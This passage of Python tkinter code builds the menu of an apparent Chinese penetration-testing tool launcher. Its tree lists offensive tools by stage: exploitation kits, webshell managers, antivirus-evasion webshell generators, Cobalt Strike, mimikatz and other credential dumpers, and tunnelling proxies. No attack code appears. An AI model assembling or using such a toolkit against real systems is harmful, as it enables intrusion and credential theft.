    style.configure("Custom.Treeview", padding=(0, 50), ipady=100)

    tree.place(relx=0, rely=0.1, relheight=0.8, relwidth=0.2)

    # APP测试
    tree.insert("", "end", "APP测试", text="APP测试")
    tree.insert("APP测试", "end", "秘钥接口收集", text="秘钥接口收集")
    tree.insert("秘钥接口收集", "end", "AppInfoScanner", text="AppInfoScanner")
    tree.insert("APP测试", "end", "查壳脱壳", text="查壳脱壳")


    # 信息收集
    tree.insert("", "end", "信息收集", text="信息收集")
    tree.insert("信息收集", "end", "语法生成", text="语法生成")
    tree.insert("信息收集", "end", "0x7eTeamTools", text="0x7eTeamTools")
    tree.insert("信息收集", "end", "JSFinder", text="JSFinder")
    tree.insert("信息收集", "end", "URLFinder", text="URLFinder")
    tree.insert("信息收集", "end", "信息收集1", text="spider_fofa")
    tree.insert("信息收集", "end", "URL分类", text="URL分类")
    # 信息收集 小程序
    tree.insert("信息收集", "end", "小程序", text="小程序")
    tree.insert("小程序", "end", "Check_encrypt_for_Applet", text="Check_encrypt_for_Applet")
    tree.insert("小程序", "end", "wxappUnpacker", text="wxappUnpacker")

    # asset_deal
    tree.insert("信息收集", "end", "信息收集4", text="asset_deal")
    # 子域名收集啥的
    tree.insert("信息收集", "end", "enscan", text="enscan")
    tree.insert("信息收集", "end", "信息收集3", text="OneForAll")
    tree.insert("信息收集", "end", "信息收集6", text="JsInfo-Scan")  # 子域名收集，邮箱，IP收集
    tree.insert("信息收集", "end", "信息收集7", text="theHarvester")  # 子域名收集，邮箱，IP收集
    tree.insert("信息收集", "end", "信息收集8", text="fofaviewer")
    # tree.insert("信息收集", "end", "infoPorter_GUI", text="infoPorter_GUI")
    tree.insert("信息收集", "end", "信息收集9", text="dontgo403")
    tree.insert("信息收集", "end", "信息收集10", text="DNSub")  # 子域名收集，IP收集

    tree.insert("", "end", "存活探测", text="存活探测")

    tree.insert("存活探测", "end", "存活探测1", text="dirsearch")
    tree.insert("存活探测", "end", "Caesar", text="Caesar")
    tree.insert("存活探测", "end", "arjun", text="arjun")
    tree.insert("存活探测", "end", "存活探测2", text="httpx")
    tree.insert("存活探测", "end", "存活探测3", text="rad_windows")
    tree.insert("存活探测", "end", "存活探测4", text="小米范")
    tree.insert("存活探测", "end", "存活探测5", text="naabu")
    tree.insert("存活探测", "end", "kscan", text="kscan")
    tree.insert("存活探测", "end", "存活探测6", text="ffuf")
    tree.insert("存活探测", "end", "存活探测7", text="katana")

    tree.insert("", "end", "指纹识别", text="指纹识别")
    tree.insert("指纹识别", "end", "指纹识别1", text="Ehole3.0-Win")
    tree.insert("指纹识别", "end", "observer_ward", text="observer_ward")

    tree.insert("", "end", "漏洞探测", text="漏洞探测")
    tree.insert("漏洞探测", "end", "漏洞探测1", text="nuclei")
    tree.insert("漏洞探测", "end", "漏洞探测2", text="xray")
    tree.insert("漏洞探测", "end", "漏洞探测3", text="vulmap")
    tree.insert("漏洞探测", "end", "xpoc_windows_amd64", text="xpoc_windows_amd64")
    tree.insert("漏洞探测", "end", "漏洞探测4", text="packer-fuzz")
    tree.insert("漏洞探测", "end", "jjjjjjjjjjjjjs", text="jjjjjjjjjjjjjs")
    tree.insert("漏洞探测", "end", "漏洞探测5", text="railgun")
    tree.insert("漏洞探测", "end", "漏洞探测6", text="goby")
    tree.insert("漏洞探测", "end", "漏洞探测7", text="XSStrike")
    tree.insert("漏洞探测", "end", "log4j", text="log4j")
    tree.insert("漏洞探测", "end", "unauthorized", text="unauthorized")
    tree.insert("漏洞探测", "end", "ihoneyBakFileScan_Modify", text="ihoneyBakFileScan_Modify")
    tree.insert("漏洞探测", "end", "BBScan", text="BBScan")
    tree.insert("漏洞探测", "end", "Find-SomeThing", text="Find-SomeThing")

    tree.insert("", "end", "漏洞利用", text="漏洞利用")
    tree.insert("漏洞利用", "end", "SBSCAN-0.5", text="SBSCAN-0.5")
    tree.insert("漏洞利用", "end", "0day_2023", text="0day_2023")
    tree.insert("漏洞利用", "end", "Oday_v1.0.3", text="Oday_v1.0.3")
    tree.insert("漏洞利用", "end", "secret_killer", text="secret_killer")
    tree.insert("漏洞利用", "end", "Hyacinth", text="Hyacinth")
    tree.insert("漏洞利用", "end", "漏洞利用2", text="sqlmap")
    tree.insert("漏洞利用", "end", "漏洞利用3", text="shiro")
    tree.insert("漏洞利用", "end", "漏洞利用4", text="thinkphp")
    tree.insert("漏洞利用", "end", "漏洞利用5", text="struts2")
    tree.insert("漏洞利用", "end", "漏洞利用6", text="springboot")
    tree.insert("漏洞利用", "end", "漏洞利用7", text="weblogic")
    tree.insert("漏洞利用", "end", "OA-EXPTOOL", text="OA-EXPTOOL")
    tree.insert("漏洞利用", "end", "weekoa", text="weekoa")
    tree.insert("漏洞利用", "end", "apt_t00ls", text="apt_t00ls")
    tree.insert("漏洞利用", "end", "IWannaGetAll", text="IWannaGetAll")
    tree.insert("漏洞利用", "end", "exp-tools", text="exp_tools")
    tree.insert("漏洞利用", "end", "漏洞利用8", text="liqun(内部1.5.5)")
    tree.insert("漏洞利用", "end", "漏洞利用9", text="liqun1.5.1")
    tree.insert("漏洞利用", "end", "漏洞利用10", text="Thelostworld OA")
    tree.insert("漏洞利用", "end", "TongdaOATool1.3", text="TongdaOATool1.3")
    tree.insert("漏洞利用", "end", "漏洞利用11", text="向日葵RCE")
    tree.insert("漏洞利用", "end", "CF", text="CF")
    tree.insert("漏洞利用", "end", "dumpall", text="dumpall")
    tree.insert("漏洞利用", "end", "payload", text="payload")
    tree.insert("漏洞利用", "end", "SmartBI", text="SmartBI")
    tree.insert("漏洞利用", "end", "若依", text="若依")
    tree.insert("漏洞利用", "end", "yongyouNC", text="yongyouNC")
    tree.insert("漏洞利用", "end", "xxl-job", text="xxl-job")

    tree.insert("", "end", "WebShell管理", text="WebShell管理")
    tree.insert("WebShell管理", "end", "WebShell管理1", text="冰蝎")
    tree.insert("WebShell管理", "end", "WebShell管理2", text="哥斯拉")
    tree.insert("WebShell管理", "end", "WebShell管理3", text="蚁剑")
    tree.insert("WebShell管理", "end", "冰蝎4", text="冰蝎4")
    tree.insert("WebShell管理", "end", "天蝎", text="天蝎")

    tree.insert("", "end", "综合免杀", text="综合免杀")
    tree.insert("综合免杀", "end", "Webshell_Generate", text="Webshell_Generate")
    # tree.insert("综合免杀", "end", "免杀的webshell", text="免杀的webshell")
    # tree.insert("综合免杀", "end", "jsp免杀", text="jsp免杀")
    tree.insert("综合免杀", "end", "XG_NTAI", text="XG_NTAI")

    tree.insert("", "end", "内网工具", text="内网工具")
    tree.insert("内网工具", "end", "内网工具1", text="fscan")
    tree.insert("内网工具", "end", "内网工具2", text="cobaltstrike")
    tree.insert("内网工具", "end", "内网工具4", text="主机提权")
    tree.insert("内网工具", "end", "Impacket_PyQt5-main", text="Impacket_PyQt5-main")

    tree.insert("", "end", "内网连接", text="内网连接")
    tree.insert("内网连接", "end", "内网连接1", text="Multiple.Database.Utilization.Tools-2.1.1")
    tree.insert("内网连接", "end", "netcat", text="netcat")

    tree.insert("", "end", "代理转发", text="代理转发")
    tree.insert("代理转发", "end", "SmallProxyPool", text="SmallProxyPool")
    tree.insert("代理转发", "end", "代理转发1", text="frp_windows")
    tree.insert("代理转发", "end", "代理转发2", text="frp_linux")
    tree.insert("代理转发", "end", "代理转发3", text="Neo-reGeorg")
    tree.insert("代理转发", "end", "代理转发4", text="ew")
    tree.insert("代理转发", "end", "代理转发5", text="reGeorg")
    tree.insert("代理转发", "end", "Forest", text="Forest")

    tree.insert("", "end", "字典生成", text="字典生成")
    tree.insert("字典生成", "end", "字典生成1", text="针对性字典生成")
    # tree.insert("字典生成", "end", "Guess_Dictionary", text="Guess_Dictionary")
    tree.insert("字典生成", "end", "dictx", text="dictx")
    tree.insert("字典生成", "end", "字典生成2", text="白鹿社工字典")
    # tree.insert("字典生成", "end", "社工字典生成", text="社工字典生成")
    tree.insert("字典生成", "end", "哈希碰撞", text="hashcat")

    tree.insert("", "end", "横向工具", text="横向工具")
    tree.insert("横向工具", "end", "横向工具1", text="psexec")

    tree.insert("", "end", "密码hash", text="密码hash")
    tree.insert("密码hash", "end", "mimikatz", text="mimikatz")
    tree.insert("密码hash", "end", "procdump", text="procdump")
    tree.insert("密码hash", "end", "Outflank-Dumpert", text="Outflank-Dumpert")
    tree.insert("密码hash", "end", "hack-browser", text="hack-browser")

    # 逆向分析
    tree.insert("", "end", "逆向分析", text="逆向分析")
    tree.insert("逆向分析", "end", "x64dbg_new", text="x64dbg_new")

    tree.insert("", "end", "其它", text="其它")
    tree.insert("其它", "end", "SRC挖掘", text="SRC挖掘")
    tree.insert("其它", "end", "CheckList&成果", text="CheckList&成果")
    tree.insert("其它", "end", "知识库", text="知识库")
    tree.insert("其它", "end", "环境搭建", text="环境搭建")
    tree.insert("其它", "end", "插件", text="插件")

    # 创建名为"mytag"的tag并为其配置字体
    tree.tag_configure("mytag", font=("宋体", 15))

    # 为所有项目应用"mytag"标签
    for item in tree.get_children():
        tree.item(item, tags=("mytag",))

    # 创建文本框,显示介绍内容，及输入内容
    text = tk.Text(root)
    text.place(relx=0.2, rely=0, relheight=0.3, relwidth=0.8)
    # 显示生成命令
    text1 = tk.Text(root)
    text1.place(relx=0.2, rely=0.3, relheight=0.3, relwidth=0.8)
    # 显示结果
    text2 = tk.Text(root)
    text2.place(relx=0.2, rely=0.7, relheight=0.3, relwidth=0.8)

    # 按钮功能
    Button1 = tk.Button(root, text="写入文件", font=("宋体", 15))
    Button1.place(relx=0.2, rely=0.61, relwidth=0.2, relheight=0.06)

    # 按钮功能
    Button2 = tk.Button(root, text="复制命令", font=("宋体", 15))
    Button2.place(relx=0.4, rely=0.61, relwidth=0.2, relheight=0.06)

    # 按钮功能
    Button3 = tk.Button(root, text="打开CMD", font=("宋体", 15))
    Button3.place(relx=0.6, rely=0.61, relwidth=0.2, relheight=0.06)

    # 按钮功能
    Button3 = tk.Button(root, text="打开结果文件夹", font=("宋体", 15))
    Button3.place(relx=0.8, rely=0.61, relwidth=0.2, relheight=0.06)

    # 绑定事件
    tree.bind("<Double-1>", show_text)

    # 设定退出消息框
    root.protocol("WM_DELETE_WINDOW", on_closing)
    # 进入消息循环
    root.mainloop()
